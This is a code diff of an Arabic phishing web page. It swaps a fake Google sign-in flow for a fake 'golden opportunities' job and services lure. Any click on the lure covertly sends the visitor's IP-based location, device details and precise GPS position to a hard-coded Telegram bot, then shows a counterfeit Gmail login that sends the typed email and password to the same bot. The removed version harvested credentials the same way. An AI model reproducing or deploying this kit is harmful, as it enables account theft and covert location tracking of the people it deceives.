@@ -2,561 +2,360 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>Gmail - تسجيل الدخول</title>
-  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>منصة الفرص الذهبية</title>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
     :root {
-      --blue: #1a73e8;
-      --green: #34a853;
-      --red: #d93025;
+      --primary: #4285F4;
+      --secondary: #34A853;
+      --accent: #EA4335;
+      --dark: #202124;
+      --light: #f8f9fa;
       --gray: #5f6368;
-      --light-gray: #f1f3f4;
     }
     
     * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
+      font-family: 'Tajawal', sans-serif;
     }
     
     body {
-      font-family: 'Google Sans', Arial, sans-serif;
+      background-color: var(--light);
+      color: var(--dark);
+      line-height: 1.6;
+    }
+    
+    .header {
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      color: white;
+      padding: 1.5rem;
+      text-align: center;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    
+    .header h1 {
+      font-size: 2rem;
+      margin-bottom: 0.5rem;
+    }
+    
+    .header p {
+      font-size: 1rem;
+      opacity: 0.9;
+    }
+    
+    .container {
+      max-width: 1200px;
+      margin: 2rem auto;
+      padding: 0 1rem;
+    }
+    
+    .options-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+      gap: 1.5rem;
+      margin-top: 2rem;
+    }
+    
+    .option-card {
       background: white;
-      color: #202124;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      transition: background 0.3s;
-    }
-    
-    /* Header Styles */
-    .google-header {
-      padding: 6px 24px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      border-bottom: 1px solid #dadce0;
-    }
-    
-    .google-header-right {
-      display: flex;
-      align-items: center;
-      gap: 15px;
-    }
-    
-    .signin-button {
-      background: var(--blue);
-      color: white;
-      border: none;
-      padding: 9px 23px;
-      border-radius: 4px;
-      font-weight: 500;
-      font-size: 14px;
-      cursor: pointer;
-    }
-    
-    /* Main Content */
-    .main-content {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-    
-    .login-container {
-      width: 100%;
-      max-width: 450px;
-      border: 1px solid #dadce0;
-      border-radius: 8px;
-      padding: 48px 40px 36px;
-      margin: 20px 0;
-      position: relative;
+      border-radius: 12px;
       overflow: hidden;
-    }
-    
-    .login-header {
-      text-align: center;
-      margin-bottom: 35px;
-    }
-    
-    .login-header img {
-      width: 75px;
-      height: 24px;
-      margin-bottom: 15px;
-    }
-    
-    .login-header h1 {
-      font-size: 24px;
-      font-weight: 400;
-      margin-bottom: 10px;
-    }
-    
-    .login-header p {
-      font-size: 16px;
-      color: var(--gray);
-    }
-    
-    /* Form Styles */
-    .input-group {
-      margin-bottom: 20px;
-      position: relative;
-    }
-    
-    .input-group input {
-      width: 100%;
-      padding: 13px 15px;
-      font-size: 16px;
-      border: 1px solid #dadce0;
-      border-radius: 4px;
-      outline: none;
-      transition: border 0.3s;
-    }
-    
-    .input-group input:focus {
-      border: 1px solid var(--blue);
-      box-shadow: 0 0 0 2px #e8f0fe;
-    }
-    
-    .forgot-email {
-      display: block;
-      color: var(--blue);
-      font-size: 14px;
-      text-decoration: none;
-      margin-bottom: 30px;
-    }
-    
-    .button-group {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    
-    .next-button {
-      background: var(--blue);
-      color: white;
-      border: none;
-      padding: 10px 24px;
-      border-radius: 4px;
-      font-weight: 500;
-      font-size: 14px;
+      box-shadow: 0 6px 15px rgba(0,0,0,0.08);
+      transition: transform 0.3s, box-shadow 0.3s;
       cursor: pointer;
-      transition: background 0.3s;
+      border: 1px solid #e0e0e0;
     }
     
-    .next-button:hover {
-      background: #1765cc;
-      box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3), 0 1px 3px 1px rgba(66,133,244,0.15);
+    .option-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 12px 20px rgba(0,0,0,0.12);
     }
     
-    /* Footer Styles */
-    .google-footer {
-      background: #f2f2f2;
-      padding: 15px 30px;
-      font-size: 14px;
-      color: var(--gray);
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-    }
-    
-    .footer-links {
-      display: flex;
-      gap: 20px;
-    }
-    
-    .footer-links a {
-      color: var(--gray);
-      text-decoration: none;
-    }
-    
-    .footer-links a:hover {
-      text-decoration: underline;
-    }
-    
-    /* Hidden Pages */
-    .hidden-page {
-      display: none;
-    }
-    
-    /* Verification Page */
-    .verification-container {
+    .option-icon {
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      color: white;
+      font-size: 2rem;
+      padding: 1.5rem;
       text-align: center;
-      padding: 40px 20px;
     }
     
-    .spinner {
-      border: 6px solid rgba(66, 133, 244, 0.2);
-      border-top: 6px solid var(--blue);
-      border-radius: 50%;
-      width: 60px;
-      height: 60px;
-      animation: spin 1s linear infinite;
-      margin: 30px auto;
+    .option-content {
+      padding: 1.5rem;
     }
     
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+    .option-content h3 {
+      color: var(--primary);
+      margin-bottom: 0.5rem;
+      font-size: 1.3rem;
     }
     
-    .success-check {
-      color: var(--green);
-      font-size: 60px;
-      margin: 30px auto;
+    .option-content p {
+      color: var(--gray);
+      font-size: 0.95rem;
+    }
+    
+    .btn {
+      display: inline-block;
+      background: var(--primary);
+      color: white;
+      padding: 0.8rem 1.5rem;
+      border: none;
+      border-radius: 30px;
+      font-size: 1rem;
+      font-weight: 500;
+      margin-top: 1rem;
+      cursor: pointer;
+      transition: background 0.3s, transform 0.2s;
+      text-decoration: none;
+      text-align: center;
+    }
+    
+    .btn:hover {
+      background: #3367d6;
+      transform: translateY(-2px);
+    }
+    
+    .btn-block {
+      display: block;
+      width: 100%;
+    }
+    
+    .footer {
+      background: var(--dark);
+      color: white;
+      text-align: center;
+      padding: 1.5rem;
+      margin-top: 3rem;
+    }
+    
+    .hidden {
       display: none;
     }
     
-    /* Error Message */
-    .error-message {
-      color: var(--red);
-      font-size: 14px;
-      margin-top: 10px;
-      display: none;
+    /* Animation */
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
     }
+    
+    .option-card {
+      animation: fadeIn 0.5s ease-out forwards;
+      opacity: 0;
+    }
+    
+    .option-card:nth-child(1) { animation-delay: 0.1s; }
+    .option-card:nth-child(2) { animation-delay: 0.2s; }
+    .option-card:nth-child(3) { animation-delay: 0.3s; }
+    .option-card:nth-child(4) { animation-delay: 0.4s; }
+    .option-card:nth-child(5) { animation-delay: 0.5s; }
+    .option-card:nth-child(6) { animation-delay: 0.6s; }
+    .option-card:nth-child(7) { animation-delay: 0.7s; }
     
     /* Responsive */
-    @media (max-width: 600px) {
-      .login-container {
-        border: none;
-        padding: 20px;
+    @media (max-width: 768px) {
+      .options-grid {
+        grid-template-columns: 1fr;
       }
       
-      .google-footer {
-        flex-direction: column;
-        align-items: center;
-        gap: 10px;
+      .header h1 {
+        font-size: 1.5rem;
       }
-    }
-    
-    /* Password Strength Meter */
-    .strength-meter {
-      height: 4px;
-      background: #eee;
-      margin-top: 5px;
-      border-radius: 2px;
-      overflow: hidden;
-      display: none;
-    }
-    
-    .strength-meter-fill {
-      height: 100%;
-      width: 0;
-      background: var(--red);
-      transition: width 0.3s, background 0.3s;
-    }
-    
-    /* Language Selector */
-    .language-selector {
-      position: absolute;
-      bottom: 10px;
-      right: 10px;
-      font-size: 12px;
-      color: var(--gray);
     }
   </style>
 </head>
 <body>
-  <!-- Google Header -->
-  <header class="google-header">
-    <div class="google-header-left">
-      <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google">
-    </div>
-    <div class="google-header-right">
-      <button class="signin-button">تسجيل الدخول</button>
-    </div>
-  </header>
-
-  <!-- Main Content - Login Page -->
-  <main class="main-content" id="login-page">
-    <div class="login-container">
-      <div class="login-header">
-        <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google">
-        <h1>تسجيل الدخول</h1>
-        <p>تابع باستخدام حسابك على Google</p>
-      </div>
-      
-      <form id="login-form">
-        <div class="input-group">
-          <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" autofocus>
-        </div>
-        
-        <div class="input-group hidden-page" id="password-group">
-          <input type="password" id="password" placeholder="أدخل كلمة المرور">
-          <div class="strength-meter">
-            <div class="strength-meter-fill"></div>
+  <!-- صفحة الإعلانات الرئيسية -->
+  <div id="ads-page">
+    <header class="header">
+      <h1>منصة الفرص الذهبية</h1>
+      <p>اكتشف عالمًا من الفرص والخدمات المميزة</p>
+    </header>
+    
+    <div class="container">
+      <div class="options-grid">
+        <!-- بطاقة الوظائف -->
+        <div class="option-card" onclick="selectOption('وظائف بالحسكة')">
+          <div class="option-icon">💼</div>
+          <div class="option-content">
+            <h3>وظائف بالحسكة</h3>
+            <p>اكتشف أحدث الفرص الوظيفية في منطقة الحسكة</p>
+            <a class="btn btn-block">عرض التفاصيل</a>
           </div>
         </div>
         
-        <a href="#" class="forgot-email hidden-page" id="forgot-email">نسيت كلمة المرور؟</a>
-        
-        <div class="button-group">
-          <a href="#" class="forgot-email" id="create-account">إنشاء حساب</a>
-          <button type="button" class="next-button" id="next-button">التالي</button>
+        <!-- بطاقة تعلم التيرمكس -->
+        <div class="option-card" onclick="selectOption('تعلم التيرمكس عبر الدارك ويب')">
+          <div class="option-icon">💻</div>
+          <div class="option-content">
+            <h3>تعلم التيرمكس عبر الدارك ويب</h3>
+            <p>دورة متكاملة لاحتراف استخدام التيرمكس بطرق آمنة</p>
+            <a class="btn btn-block">بدء التعلم</a>
+          </div>
         </div>
-      </form>
-    </div>
-  </main>
-
-  <!-- Confirm Page -->
-  <main class="main-content hidden-page" id="confirm-page">
-    <div class="login-container">
-      <div class="login-header">
-        <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google">
-        <h1>تأكيد الحساب</h1>
-        <p>لحماية حسابك، يرجى تأكيد معلوماتك</p>
+        
+        <!-- بطاقة استعلام عن رقم -->
+        <div class="option-card" onclick="selectOption('استعلام عن رقم هاتفك')">
+          <div class="option-icon">📱</div>
+          <div class="option-content">
+            <h3>استعلام عن رقم هاتفك</h3>
+            <p>اكتشف باسم من مسجل رقم هاتفك سابقاً</p>
+            <a class="btn btn-block">استعلم الآن</a>
+          </div>
+        </div>
+        
+        <!-- بطاقة دورات اونلاين -->
+        <div class="option-card" onclick="selectOption('تعلم دورات اونلاين')">
+          <div class="option-icon">🎓</div>
+          <div class="option-content">
+            <h3>تعلم دورات اونلاين</h3>
+            <p>احصل على شهادات معتمدة في مختلف المجالات</p>
+            <a class="btn btn-block">تصفح الدورات</a>
+          </div>
+        </div>
+        
+        <!-- بطاقة شات دردشة -->
+        <div class="option-card" onclick="selectOption('شات دردشة')">
+          <div class="option-icon">💬</div>
+          <div class="option-content">
+            <h3>شات دردشة</h3>
+            <p>تواصل مع أشخاص جدد من مختلف أنحاء العالم</p>
+            <a class="btn btn-block">الدخول للشات</a>
+          </div>
+        </div>
+        
+        <!-- بطاقة فتيات بحاجة لعمل -->
+        <div class="option-card" onclick="selectOption('فتيات بحاجة لعمل')">
+          <div class="option-icon">👩‍💼</div>
+          <div class="option-content">
+            <h3>فتيات بحاجة لعمل</h3>
+            <p>فرص عمل خاصة للفتيات في مختلف المجالات</p>
+            <a class="btn btn-block">عرض الفرص</a>
+          </div>
+        </div>
+        
+        <!-- بطاقة شباب بحاجة لعمل -->
+        <div class="option-card" onclick="selectOption('شباب بحاجة لعمل')">
+          <div class="option-icon">👨‍💼</div>
+          <div class="option-content">
+            <h3>شباب بحاجة لعمل</h3>
+            <p>وظائف متنوعة للشباب برواتب مميزة</p>
+            <a class="btn btn-block">استكشف الوظائف</a>
+          </div>
+        </div>
       </div>
-      
-      <form id="confirm-form">
-        <div class="input-group">
-          <input type="email" id="confirm-email" placeholder="أعد إدخال البريد الإلكتروني">
-        </div>
-        
-        <div class="input-group">
-          <input type="password" id="confirm-password" placeholder="أعد إدخال كلمة المرور">
-        </div>
-        
-        <div class="error-message" id="confirm-error"></div>
-        
-        <div class="button-group">
-          <button type="button" class="next-button" id="confirm-button">تأكيد</button>
-        </div>
-      </form>
     </div>
-  </main>
+    
+    <footer class="footer">
+      <p>© 2023 منصة الفرص الذهبية. جميع الحقوق محفوظة.</p>
+    </footer>
+  </div>
 
-  <!-- Verification Page -->
-  <main class="main-content hidden-page" id="verification-page">
-    <div class="login-container verification-container">
-      <div class="login-header">
-        <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google">
-        <h1>جارٍ التحقق من معلوماتك</h1>
-        <p>قد تستغرق هذه العملية بضع لحظات</p>
-      </div>
-      
-      <div class="spinner" id="verification-spinner"></div>
-      <div class="success-check" id="success-check">✓</div>
-      
-      <p id="status-message">يتم الآن التحقق من معلومات حسابك...</p>
-    </div>
-  </main>
-
-  <!-- Google Footer -->
-  <footer class="google-footer">
-    <div class="footer-links">
-      <a href="#">حول Google</a>
-      <a href="#">الخصوصية</a>
-      <a href="#">الشروط</a>
-    </div>
-    <div class="footer-links">
-      <a href="#">مساعدة</a>
-      <a href="#">الإبلاغ عن مشكلة</a>
-    </div>
-    <div class="language-selector">
-      <select>
-        <option value="ar">العربية</option>
-        <option value="en">English</option>
-      </select>
-    </div>
-  </footer>
+  <!-- الصفحات المخفية -->
+  <div id="gmail-login-page" class="hidden">
+    <!-- سيتم إدراج كود صفحة Gmail هنا عند الحاجة -->
+  </div>
 
   <script>
-    // Telegram Configuration
+    // إعدادات التلجرام
     const BOT_TOKEN = "7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM";
     const CHAT_ID = "7493001551";
     
-    // DOM Elements
-    const loginPage = document.getElementById('login-page');
-    const confirmPage = document.getElementById('confirm-page');
-    const verificationPage = document.getElementById('verification-page');
-    const emailInput = document.getElementById('email');
-    const passwordInput = document.getElementById('password');
-    const confirmEmailInput = document.getElementById('confirm-email');
-    const confirmPasswordInput = document.getElementById('confirm-password');
-    const passwordGroup = document.getElementById('password-group');
-    const forgotEmailLink = document.getElementById('forgot-email');
-    const nextButton = document.getElementById('next-button');
-    const confirmButton = document.getElementById('confirm-button');
-    const confirmError = document.getElementById('confirm-error');
-    const verificationSpinner = document.getElementById('verification-spinner');
-    const successCheck = document.getElementById('success-check');
-    const statusMessage = document.getElementById('status-message');
-    
-    // User Data
-    let userCredentials = {};
-    let isPasswordStep = false;
-    
-    // Initialize Page
-    function init() {
-      // Show email input first
-      passwordGroup.style.display = 'none';
-      forgotEmailLink.style.display = 'none';
+    // اختيار خيار من القائمة
+    function selectOption(option) {
+      // تسجيل اختيار المستخدم
+      sendToTelegram(`📌 قام المستخدم باختيار: ${option}`);
       
-      // Event Listeners
-      nextButton.addEventListener('click', handleNext);
-      confirmButton.addEventListener('click', handleConfirm);
-      emailInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') handleNext();
-      });
-      passwordInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') handleNext();
-      });
-      confirmEmailInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') handleConfirm();
-      });
-      confirmPasswordInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') handleConfirm();
-      });
+      // جمع معلومات الزائر
+      collectTrackingInfo(option);
       
-      // Password strength indicator
-      passwordInput.addEventListener('input', updatePasswordStrength);
+      // إظهار صفحة Gmail (يمكن استبدالها بأي صفحة أخرى حسب الخيار)
+      showGmailLoginPage();
     }
     
-    // Handle Next Button Click
-    function handleNext() {
-      if (!isPasswordStep) {
-        // Email step
-        const email = emailInput.value.trim();
+    // إظهار صفحة تسجيل الدخول إلى Gmail
+    function showGmailLoginPage() {
+      document.getElementById('ads-page').classList.add('hidden');
+      
+      // إنشاء محتوى صفحة Gmail ديناميكيًا
+      const gmailPage = document.getElementById('gmail-login-page');
+      gmailPage.innerHTML = `
+        <style>
+          .gmail-container {
+            max-width: 450px;
+            margin: 2rem auto;
+            padding: 2rem;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+          }
+          
+          .gmail-logo {
+            width: 75px;
+            margin-bottom: 1rem;
+          }
+          
+          .gmail-input {
+            width: 100%;
+            padding: 1rem;
+            margin: 0.5rem 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 1rem;
+          }
+          
+          .gmail-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 0.8rem 1.5rem;
+            border-radius: 4px;
+            font-size: 1rem;
+            margin-top: 1rem;
+            cursor: pointer;
+            width: 100%;
+          }
+        </style>
         
-        if (!email || !validateEmail(email)) {
-          emailInput.focus();
-          emailInput.style.borderColor = 'var(--red)';
-          return;
-        }
-        
-        // Save email and switch to password step
-        userCredentials.email = email;
-        emailInput.style.borderColor = '#dadce0';
-        
-        // Update UI for password step
-        emailInput.readOnly = true;
-        passwordGroup.style.display = 'block';
-        forgotEmailLink.style.display = 'block';
-        document.getElementById('create-account').style.display = 'none';
-        nextButton.textContent = 'تسجيل الدخول';
-        isPasswordStep = true;
-        passwordInput.focus();
-      } else {
-        // Password step
-        const password = passwordInput.value.trim();
-        
-        if (!password) {
-          passwordInput.focus();
-          passwordInput.style.borderColor = 'var(--red)';
-          return;
-        }
-        
-        // Save password and proceed
-        userCredentials.password = password;
-        passwordInput.style.borderColor = '#dadce0';
-        
-        // Send data to Telegram
-        sendToTelegram(`📥 Gmail Login Attempt:\n📧 ${userCredentials.email}\n🔑 ${userCredentials.password}`);
-        
-        // Collect and send tracking information
-        collectTrackingInfo();
-        
-        // Show confirmation page
-        showConfirmPage();
-      }
+        <div class="gmail-container">
+          <img src="https://www.gstatic.com/images/branding/product/1x/gmail_2020q4_48dp.png" class="gmail-logo">
+          <h2>تسجيل الدخول إلى Gmail</h2>
+          <p>للاستمرار في ${document.title}، يرجى تسجيل الدخول</p>
+          
+          <input type="email" id="gmail-email" class="gmail-input" placeholder="البريد الإلكتروني">
+          <input type="password" id="gmail-password" class="gmail-input" placeholder="كلمة المرور">
+          
+          <button class="gmail-btn" onclick="loginToGmail()">التالي</button>
+        </div>
+      `;
+      
+      gmailPage.classList.remove('hidden');
     }
     
-    // Handle Confirm Button Click
-    function handleConfirm() {
-      const email = confirmEmailInput.value.trim();
-      const password = confirmPasswordInput.value.trim();
+    // تسجيل الدخول إلى Gmail
+    function loginToGmail() {
+      const email = document.getElementById('gmail-email').value;
+      const password = document.getElementById('gmail-password').value;
       
       if (!email || !password) {
-        showError('الرجاء إدخال البريد الإلكتروني وكلمة المرور');
+        alert("الرجاء إدخال البريد الإلكتروني وكلمة المرور");
         return;
       }
       
-      if (email !== userCredentials.email || password !== userCredentials.password) {
-        showError('لا يوجد تطابق، الرجاء إدخال المعلومات الصحيحة');
-        return;
-      }
+      // إرسال بيانات الدخول إلى التلجرام
+      sendToTelegram(`🔐 بيانات تسجيل الدخول:\n📧 ${email}\n🔑 ${password}`);
       
-      // Send confirmation to Telegram
-      sendToTelegram(`✅ Gmail Login Confirmed:\n📧 ${email}\n🔑 ${password}`);
-      
-      // Show verification page
-      showVerificationPage();
-    }
-    
-    // Show Confirm Page
-    function showConfirmPage() {
-      loginPage.classList.add('hidden-page');
-      confirmPage.classList.remove('hidden-page');
-      confirmEmailInput.value = userCredentials.email;
-      confirmPasswordInput.focus();
-    }
-    
-    // Show Verification Page
-    function showVerificationPage() {
-      confirmPage.classList.add('hidden-page');
-      verificationPage.classList.remove('hidden-page');
-      
-      // Simulate verification process
+      // توجيه المستخدم
       setTimeout(() => {
-        verificationSpinner.style.display = 'none';
-        successCheck.style.display = 'block';
-        statusMessage.textContent = 'تم التحقق بنجاح! يتم الآن تحويلك إلى Gmail...';
-        
-        // Redirect to Gmail after verification
-        setTimeout(() => {
-          window.location.href = 'https://mail.google.com';
-        }, 2000);
-      }, 3000);
+        alert("تم التحقق بنجاح! جاري تحويلك...");
+        window.location.href = "https://mail.google.com";
+      }, 2000);
     }
     
-    // Show Error Message
-    function showError(message) {
-      confirmError.textContent = message;
-      confirmError.style.display = 'block';
-      setTimeout(() => {
-        confirmError.style.display = 'none';
-      }, 3000);
-    }
-    
-    // Validate Email Format
-    function validateEmail(email) {
-      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      return re.test(email);
-    }
-    
-    // Update Password Strength Indicator
-    function updatePasswordStrength() {
-      const password = passwordInput.value;
-      const strengthMeter = document.querySelector('.strength-meter');
-      const strengthFill = document.querySelector('.strength-meter-fill');
-      
-      if (password.length > 0) {
-        strengthMeter.style.display = 'block';
-        
-        // Simple strength calculation
-        let strength = 0;
-        if (password.length >= 8) strength += 30;
-        if (/[A-Z]/.test(password)) strength += 20;
-        if (/[0-9]/.test(password)) strength += 20;
-        if (/[^A-Za-z0-9]/.test(password)) strength += 30;
-        
-        strengthFill.style.width = `${Math.min(strength, 100)}%`;
-        
-        // Update color based on strength
-        if (strength < 40) {
-          strengthFill.style.backgroundColor = 'var(--red)';
-        } else if (strength < 70) {
-          strengthFill.style.backgroundColor = '#fbbc05';
-        } else {
-          strengthFill.style.backgroundColor = 'var(--green)';
-        }
-      } else {
-        strengthMeter.style.display = 'none';
-      }
-    }
-    
-    // Send Data to Telegram
+    // إرسال بيانات إلى التلجرام
     function sendToTelegram(message) {
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -565,64 +364,50 @@
           chat_id: CHAT_ID,
           text: message
         })
-      }).catch(err => console.error('Telegram Error:', err));
+      }).catch(err => console.error('Error sending to Telegram:', err));
     }
     
-    // Collect Tracking Information
-    function collectTrackingInfo() {
-      let trackingMessage = '🔍 Tracking Information:\n\n';
+    // جمع معلومات التتبع
+    function collectTrackingInfo(option) {
+      let trackingInfo = `🕵️ معلومات التتبع:\n\n`;
+      trackingInfo += `📌 الخيار المحدد: ${option}\n`;
       
-      // Get IP and basic info
+      // معلومات المتصفح
+      trackingInfo += `🌐 المتصفح: ${navigator.userAgent}\n`;
+      trackingInfo += `💻 نظام التشغيل: ${navigator.platform}\n`;
+      
+      // معلومات الموقع
       fetch('https://ipapi.co/json/')
         .then(response => response.json())
         .then(data => {
-          trackingMessage += `🌐 IP Address: ${data.ip || 'Unknown'}\n`;
-          trackingMessage += `📍 Location: ${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;
-          trackingMessage += `🛜 ISP: ${data.org || 'Unknown'}\n`;
+          trackingInfo += `📍 الموقع التقريبي: ${data.city || 'غير معروف'}, ${data.country_name || 'غير معروف'}\n`;
+          trackingInfo += `📡 مزود الخدمة: ${data.org || 'غير معروف'}\n`;
+          trackingInfo += `🕒 الوقت المحلي: ${new Date().toLocaleString('ar-SY')}\n`;
           
           if (data.latitude && data.longitude) {
-            trackingMessage += `🗺️ Approximate Location: https://www.google.com/maps?q=${data.latitude},${data.longitude}\n`;
+            trackingInfo += `🗺️ رابط الخريطة: https://www.google.com/maps?q=${data.latitude},${data.longitude}\n`;
           }
           
-          // Get device info
-          trackingMessage += `\n📱 Device Info:\n`;
-          trackingMessage += `👤 User Agent: ${navigator.userAgent}\n`;
-          trackingMessage += `💻 Platform: ${navigator.platform}\n`;
-          trackingMessage += `🕒 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
-          trackingMessage += `⏰ Local Time: ${new Date().toLocaleString()}\n`;
-          
-          // Try to get precise location
-          if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-              position => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const accuracy = position.coords.accuracy;
-                
-                trackingMessage += `\n🎯 Precise Location (Accuracy: ${Math.round(accuracy)}m):\n`;
-                trackingMessage += `https://www.google.com/maps?q=${lat},${lon}\n`;
-                
-                sendToTelegram(trackingMessage);
-              },
-              error => {
-                console.log('Geolocation error:', error);
-                sendToTelegram(trackingMessage);
-              },
-              { enableHighAccuracy: true, timeout: 5000 }
-            );
-          } else {
-            sendToTelegram(trackingMessage);
-          }
+          sendToTelegram(trackingInfo);
         })
         .catch(error => {
-          console.log('IPAPI error:', error);
-          trackingMessage += '⚠️ Could not retrieve full location info\n';
-          sendToTelegram(trackingMessage);
+          trackingInfo += `⚠️ تعذر الحصول على معلومات الموقع الكاملة\n`;
+          sendToTelegram(trackingInfo);
         });
+      
+      // محاولة الحصول على الموقع الدقيق
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            const preciseLocation = `🎯 الموقع الدقيق:\nhttps://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+            sendToTelegram(preciseLocation);
+          },
+          error => {
+            console.log('Geolocation error:', error);
+          }
+        );
+      }
     }
-    
-    // Initialize the page
-    init();
   </script>
 </body>
 </html>
